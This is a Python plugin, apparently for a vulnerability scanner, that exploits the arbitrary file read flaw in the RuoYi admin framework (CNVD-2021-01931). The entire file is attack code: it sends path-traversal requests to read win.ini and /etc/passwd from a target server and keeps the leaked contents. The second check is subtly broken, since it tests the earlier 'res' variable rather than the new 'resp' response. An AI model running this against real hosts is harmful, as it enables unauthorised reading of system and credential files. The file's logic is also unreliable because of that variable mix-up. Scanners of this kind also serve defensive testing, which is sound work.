#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '若依 后台任意文件读取 CNVD-2021-01931',

      'level'     :   'medium',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target1 = '/common/download/resource?resource=/profile/../../../../Windows/win.ini'
  target2 = '/common/download/resource?resource=/profile/../../../../etc/passwd'
  url1 = url + target1
  url2 = url + target2
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "for 16-bit app support" in res.text:
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass
  try:
    resp=requests.get(url=url2,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['huixian'] = res.text
      ret['url'] = url2
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret